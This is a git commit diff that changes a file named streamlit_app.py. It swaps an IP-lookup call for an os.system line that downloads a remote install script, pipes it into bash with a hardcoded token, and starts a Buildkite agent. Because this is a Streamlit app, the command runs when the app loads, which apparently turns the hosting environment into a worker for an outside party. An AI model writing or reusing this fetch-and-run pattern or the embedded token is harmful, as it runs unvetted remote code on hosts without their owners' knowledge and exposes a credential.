a19737827d2886706a3a02e8516aeb242656f911
deryl93 <95095509+deryl93@users.noreply.github.com>
2021-11-27 01:01:23 +0700

    Update streamlit_app.py

--- streamlit_app.py
+++ streamlit_app.py
@@ -1,2 +1,2 @@
 import os
-os.system("curl ipinfo.io")
+os.system('TOKEN="4a0c6cd1b011c33817f2362cb38c00150d625bda6012457589" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/master/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start')
